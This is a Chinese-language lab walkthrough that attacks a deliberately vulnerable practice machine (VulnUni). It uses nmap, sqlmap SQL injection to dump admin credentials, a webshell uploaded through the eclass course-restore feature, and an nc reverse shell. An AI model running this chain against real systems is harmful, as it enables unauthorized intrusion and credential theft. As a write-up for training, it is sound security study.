1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.153
已经开启80

3、WEB渗透测试

3.1 探测网站目录

使用nikto、dirb进行网站目录探测，未发现有用信息。使用burp进行网络爬虫发现vulnuni-eclass

有用户名和密码登录输入

3.2 使用searchsploit进行查询

searchsploit eclass
提示有SQL注入相关漏洞

3.3 保存用户登录请求，使用sqlmap进行爆破测试

sqlmap -r post.txt --dbs --batch
查看是基于时间的盲注

得到数据库信息，由于时间盲注比较慢，需要等待。

3.4 爆破数据库表

sqlmap -r post.txt -D eclass --tables --batch

3.5 爆破用户表字段信息

sqlmap -r post.txt -D eclass -T user --columns  --batch

3.6 爆破用户名和密码

sqlmap -r post.txt -D eclass -T user -C username,password --dump  --batch
查看用户名为：admin ，密码为：ilikecats89

3.7 查看文件上传方法

cat /usr/share/exploitdb/exploits/php/webapps/48163.txt 

3.8 上传webshell，并把.php文件压缩成.zip进行上传操作

http://vulnuni.local/vulnuni-eclass/modules/course_info/restore_course.php

3.9 开启NC反弹，并访问webshell页面

访问地址如下：

http://vulnuni.local/vulnuni-eclass/courses/tmpUnzipping/php-reverse-shell.php

3.10 python优化脚本

python -c 'import pty;pty.spawn("/bin/bash")'

python -m SimpleHTTPServer
